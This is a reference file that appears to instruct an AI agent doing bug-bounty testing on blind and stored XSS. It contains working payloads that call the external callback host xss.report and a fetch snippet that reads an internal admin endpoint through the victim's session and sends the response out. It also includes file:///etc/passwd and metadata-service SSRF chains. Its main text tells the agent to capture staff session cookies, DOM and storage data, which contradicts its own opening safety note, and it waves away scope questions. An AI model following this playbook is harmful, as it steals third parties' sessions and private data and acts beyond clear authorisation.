# Blind and Stored XSS — plant, attribute, observe, and escalate

This reference preserves the complete previous blind/stored methodology. Use it only after the main `xss` skill classifies the render as stored, delayed, invisible, cross-user, privileged-viewer, log-viewer, email-viewer, or server-side browser/renderer. Context-first visible reflected and DOM workflows belong to the other `xss` references.

**Safety precedence:** the main `xss` rules and the current program policy override every legacy escalation sentence below. Any preserved instruction that says to capture a real staff token, cookie, DOM, storage value, internal record, or other third-party data must be interpreted as: reproduce the consequence with controlled accounts and controlled data, or stop at the boundary and document the exact withheld step. Never collect or replay third-party credentials, sessions, PII, or private content merely because the callback can access them.

Blind XSS is the patient hacker's High. You spray a tracked payload on every input that gets persisted, then **wait** — the script fires in a context you can never reach directly: an admin panel, a support-agent console, an internal log viewer, a headless-Chrome invoice renderer. A single fired callback runs JavaScript inside a **privileged, authenticated document** — which is worth far more than a reflected pop-up in your own browser.

**A fired callback is rung 0, not the finding.** "xss.report got a hit" proves the primitive exists; it does not prove impact. The finding is what that privileged origin lets you _do_: exfil the staff session cookie, read internal customer data through the admin's own authenticated session (this defeats HttpOnly), or turn the invoice PDF renderer into file-read / SSRF-to-metadata / RCE. **Do not stop at "the callback fired."** Climb until you have the payable proof — safely, on the ladder below.

This skill recalibrates every timid instinct in the classic blind-XSS write-up to the shared ladder in `../../_shared/references/safe-ladder.md`: read-only capture to **your own** channel → own/anonymous context → **minimal** (one record, one internal identifier — never dump the customer table) → UAT for anything risky → reach the payable impact. Capturing a staff session token or reading one internal record through the admin's session is **read-only and own-channel** (rungs 1–2) — do it. _Replaying_ that session to impersonate the admin and rifle through customer data is rung 5 (not attempted: ask d0x directly before executing). The line is _destruction / actioning another user_, never _reach_.

## d0x's OOB channel — xss.report

Channel: **xss.report**, channel ID `d0x`. The callback URL is `//xss.report/c/d0x/`. The panel captures, per hit: the **origin** (the privileged URL that loaded the script), **cookies** visible to that document (often the staff session), a **DOM snapshot**, **local/session storage**, the staff **referrer + User-Agent**, and (on some tiers) a **screenshot**.

Primary preserved payload (module import requires the effective `script-src`, cross-origin module CORS/MIME behavior, and network path to permit the request; see `payloads.md` for context-specific construction and `csp-trusted-types.md` for controls):

```html
<svg/onload=import('//xss.report/c/d0x/')>
```

**Tag every injection point** so the callback tells you which input fired in which context — this is non-negotiable at spray scale:

```
<svg/onload=import('//xss.report/c/d0x/?src=ticket-subject')>
<svg/onload=import('//xss.report/c/d0x/?src=billing-company')>
<svg/onload=import('//xss.report/c/d0x/?src=ua-header')>
```

When a hit lands you immediately know **which input** fired in **which origin**.

## Read-on-demand references

Load the one for the phase you are in:

- `injection-points.md` — the full spray map ranked by how reliably an internal viewer renders it: Tier-1 support/refund/profile/billing/invoice fields, Tier-2 UA/Referer/XFF headers + filename/EXIF that log & analytics dashboards echo, Tier-3 API-key/webhook labels, OAuth `client_name`, CSV/XLSX cells, admin-notes. Where each stores and where it renders.
- `payloads.md` — the ordered payload arsenal: context-breakouts (attribute / title / textarea / script / style / JS-string / template-literal), filter/encoding bypasses (case, whitespace, nested-tag, entity, double-URL, unicode-normalise), tag alternatives when `script` is stripped (`details/ontoggle`, `video/source`, `img/onerror`), markdown & CSTI (Angular / Vue template escape), and the **CSP-aware exfil ladder** (import → beacon → no-cors fetch → DNS) so the callback lands even under a restrictive policy.
- `callback-setup.md` — xss.report channel setup, per-point tagging scheme, the triage checklist for a landed hit, and the false-positive filter (your own IP, SES/preview sandboxes, same-origin non-privileged echoes).
- `escalation.md` — turning a fired callback into payable impact: the privileged-origin ladder, staff-session exfil, the **HttpOnly-defeating same-session internal read**, the invoice-PDF → file-read/SSRF/RCE chain, the self-XSS → other-user escalation rule, and the severity anchors.
- `../../_shared/references/output-contract.md` — where results go: the notes/leads/gadgets/findings funnel, the lead format, the `primitive|host|claim` dedup key, and the severity enum.
- `../../_shared/references/safe-ladder.md` — how far to climb to reach impact, safely: read-only → own/anon → minimal → UAT → ask d0x directly before executing.
- `../../_shared/references/public-by-default-keys.md` — resolve any key that shows up in a DOM/storage snapshot against the SKIP / PURSUE-WEAK / PURSUE table before treating it as part of the finding.

## 1. Map every persisted input (the spray surface)

Walk the app as a normal user and enumerate **every input that is stored and later rendered by someone else** — that "someone else" is the whole game. For each, record: the field name (best guess at where it stores), the likely internal viewer that renders it (admin user-list? support ticket console? invoice PDF? log viewer?), and the probable encoding context (HTML body / attribute / JS string / URL / markdown). Full ranked list in `injection-points.md`; the highest-yield families:

- **Support / contact / refund / dispute forms** — subject, message, order number, custom fields flow straight into a staff dashboard.
- **Profile / account fields admins see** — company name, billing name, display name, bio, custom URL, address, "internal note".
- **Invoice / receipt line-item descriptions** — rendered into PDFs by headless Chrome (this input also opens the RCE/SSRF chain).
- **Request headers that log & analytics viewers echo verbatim** — set the browser **User-Agent**, **Referer**, and **X-Forwarded-For** to a tagged payload. Many internal log/analytics/session-replay tools render these raw.
- **Uploaded filenames + EXIF/metadata**, **OAuth `client_name`**, **API-key / webhook labels**.

## 2. Spray with tracked, per-point-tagged payloads

Plant the tagged primary payload on every mapped input. Rotate contexts from `payloads.md` where the field looks quoted/attribute/JS. Keep a spray ledger in `targets/<program>/notes/xss-spray.md`: `input → tag → payload variant → date planted → HIT? (origin)`. Fire the planting requests through d0x's **Caido** so each is recorded for PoC replay; `curl` is a fine fallback when the proxy is not up. Self-serving the xss.report channel and planting on the assets d0x handed you is normal — that is the authorization, not a scope question.

## 3. Wait, and triage the hit

Callbacks arrive minutes to days later — some fire only when a specific staff member opens a specific dashboard. Check the panel daily for ~7 days. When a hit lands, run the triage checklist in `callback-setup.md`: confirm the **origin is not your own IP / a sandbox**, read the **origin host+path** (is it an `/admin` / staff / internal tool?), the **cookies** captured, the **DOM snapshot**, storage, and screenshot. Now you know the fired context — go escalate it.

## 4. Escalate the privileged context — this is the finding

Per `escalation.md`, climb from "callback fired" to payable impact — **read-only, to your own channel, minimal** (safe-ladder rungs 1–3):

- **Confirm the origin is privileged** — admin panel, support console, internal tool. Note the host/path and the staff role; that sizes the blast radius.
- **Exfil the staff session (if `document.cookie` is readable)** — capturing the session token to _your own_ xss.report channel proves staff-account takeover = **High** (`../../validation/references/severity-anchors.md`, High tier: "Stored XSS in admin context that steals an admin session"; `report-writing`'s worked vector scores it 7.6). You decode/validate the token to prove it is a live session; you do **not** replay it to impersonate on prod (rung 5 — not attempted: ask d0x directly before executing).
- **Defeat HttpOnly with a same-session internal read** — if the cookie is HttpOnly, the fired script still runs _inside the admin's authenticated session_, so make **one** minimal, credentialed request to an internal/admin endpoint and exfil the response to your channel. The endpoint is **whatever internal route you already know exists** for this target — read it from the DOM snapshot the callback captured, or take one handed over by `js-source-to-sink` (an admin user-list, a `/me`|`/whoami`, a config/settings route):

  ```js
  // <internal-endpoint> = the target's own internal/admin route (from the DOM
  // snapshot or js-source-to-sink) — a user-list, a /me|/whoami, a config route
  fetch("<internal-endpoint>", { credentials: "include" })
    .then((r) => r.text())
    .then((t) => (new Image().src = "//xss.report/c/d0x/?d=" + btoa(t)));
  ```

  Reading one internal record through the admin's own session is read-only and minimal (rungs 1 + 3) and is itself the High — no cookie theft needed. Pull **one** record / one internal identifier (internal hostname, ticket count, admin username, CSRF token), never the whole table.

- **The fired origin is an SSO client → take the visitor's own token.** On a first-party host registered with the estate's identity provider, any signed-in visitor's browser can produce a live access token _for that origin_ — readable from the in-page identity client with no network call, or mintable with the ambient cookie because the IdP allowlists that origin. `HttpOnly` is irrelevant. Qualify it in two `curl`s (no _enforcing_ CSP — `Report-Only` does not block; the IdP answers this origin credentialed), then take **your own** token as the proof. Full ladder, the three entry doors and the corpus cases: `escalation.md` §3b.
- **Invoice/receipt PDF renderer → escalate the engine** — if the fired origin is a headless-Chrome PDF/screenshot generator, the same injection reaches `<iframe src=file:///etc/passwd>` (local file read) or `fetch` to `169.254.169.254` (SSRF → IMDS). Hand that chain to `rce-hunting` / `ssrf-safe`.

## 5. Self-XSS only counts once it fires for another user

If the payload only executes in _your own_ session, it is Self-XSS = not payable on its own. The escalation is finding the **cross-user render**: the same stored field being displayed to an admin / support agent / another tenant. A "display name" that XSSes only your own settings page is nothing; the **same** display name rendered in the admin user-list is a stored XSS in admin context. Chase the input to where _someone else_ renders it — that render, proven by an xss.report hit from a non-you origin, is the finding.

## Non-destructive posture (recalibrated — capture, don't wreck)

Capturing a session token or reading one internal record through the fired session is read-only and own-channel — do it; that is the proof the program pays for. The boundaries are about _destruction / actioning another user_, not _reach_:

- Fire only to **your own** xss.report channel; plant on **your own / anonymous** inputs where possible (rungs 1–2).
- **Minimal**: one internal record / one identifier proves the class; state the blast radius by inference (rung 3). Never bulk-dump the customer/ticket table through the fired session.
- **Do NOT replay** a captured staff session to impersonate, perform staff actions, or read live customer PII on prod — capturing/decoding it already proves takeover; replay is rung 5 (not attempted: ask d0x directly before executing).
- If the program restricts privacy testing to **UAT/OAT**, do the deeper cross-user proof on `*-uat`/`*-oat` and state the prod-equivalent impact by inference (rung 4).
- If a DOM/storage snapshot leaks a client-side key, resolve it against `../../_shared/references/public-by-default-keys.md` before reporting — a Sentry DSN / Maps key is SKIP; a staff session token / server secret / internal record is the finding.

## Dedup against d0x's submitted corpus

d0x's submitted corpus already contains **reflected** XSS across several param families (open-redirect / `javascript:`-scheme redirect params, `/unsubscribe` batch-id params, login `cloudid` / `returnUrl` params, account-endpoint reflections, search-field reflections, and a vendor-VPN reflected-XSS CVE). Those exact reflected findings — those params on those targets — are **CLOSED**; do not re-report them. The blind/stored technique here is a **distinct class**: reuse the methodology, not the closed reports.

Dedup before you call it new: `rg -i '<primitive> <host>' ~/Desktop/skills/personal-corpus/h1/index.md ~/Desktop/skills/personal-corpus/bugcrowd/index.md`, and — when the program has one — its live ledger under `targets/<program>/reports/`, which wins over any stale export. A match on the same primitive + same host is CLOSED: rotate to the next angle.

## Output

Write one lead per confirmed hit to `targets/<program>/leads/` in the format in `../../_shared/references/output-contract.md`. The claim line names the injected input, the **fired origin** (the privileged context), and the **escalation reached** — never "the callback fired." Gate every High/Critical with the `validation` skill, then draft with `report-writing`.

### Evidence checklist (what a blind-XSS lead must carry)

- **Injection point** — exact endpoint, method, field name, and which internal viewer renders it. Recover it from the `?src=` tag via the spray ledger.
- **Payload + bypass** — the exact variant that stored _and_ fired, any filter/encoding bypass or alternate tag used (`details/ontoggle`, entity-encode, nested-tag), and the **CSP-exfil rung** that landed (import / beacon / `sendBeacon` / no-cors / DNS).
- **Fired origin — the core of the finding** — callback origin host + path proving a privileged context (`/admin`, staff console, tenant-B origin, PDF-renderer worker), plus the staff role and blast radius.
- **OOB proof** — the xss.report hit with its tag, origin, and the timestamp delta between plant and fire (that delta is what shows a staff-triggered execution rather than your own browser).
- **Escalation reached**, pick the one you proved: the staff session exfil as a decoded token _class_ (JWT header/claims or the session-cookie name, **never** the raw victim token in the report); the HttpOnly-defeating same-session read of **one** internal record/identifier, redacted; or the PDF-engine file-read / IMDS reach / RCE output.
- **Negative control** — the same field with a benign value produces no callback.
- **Self-XSS → other-user** — when the input first looked self-only, the proof it renders to another user/admin/tenant (the non-you origin).
- **Safe-ladder statement** — the rung the proof stopped at, e.g. "captured and decoded the staff session token to the own channel (rungs 1–2); did NOT replay to impersonate — rung 5 withheld, prod impact stated by inference."
- **FP exclusion** — confirm the origin is not your own IP and not an email/link-preview/AV sandbox (`callback-setup.md`).
- **Rotation note** — any exfil'd staff session gets flagged for invalidation.

Store the raw material (hit export, decoded token header/claims, the one internal record, PDF-engine output, screenshots) under `targets/<program>/notes/`; the promoted `findings/` file keeps enough to reproduce, with victim PII redacted per program policy.

## Handoffs

**Handoffs are self-invocations.** "Hand to `<skill>`" means _you_ open that skill and run it yourself, in this same session, carrying the raw primitive intact. Nobody else picks the lead up — if you stop at the handoff, the chain ends there.

- `js-source-to-sink` — mine the bundles for the internal/admin routes to target in the Step-3 same-session read, and for client-side sinks that turn a reflected value into a stored one.
- `ssrf-safe` — the fired origin is a headless-Chrome PDF/screenshot renderer: chain to `file://` read and `169.254.169.254` IMDS.
- `rce-hunting` — the PDF/template engine, or a server-side template behind the same input, reaches code execution.
- `tenant-isolation` — the stored value fires in **another tenant's** console (cross-tenant stored XSS).
- `broken-access-control` / `idor-bola` — the same-session internal read exposed an admin/object endpoint with no server-side authz; go hit that endpoint directly too, without the XSS.
- `exposed-secrets` — a DOM/storage snapshot carried a server-side key or token (resolve it against `../../_shared/references/public-by-default-keys.md` first).
- `validation` — every High/Critical claim, before the report. Then `report-writing`.
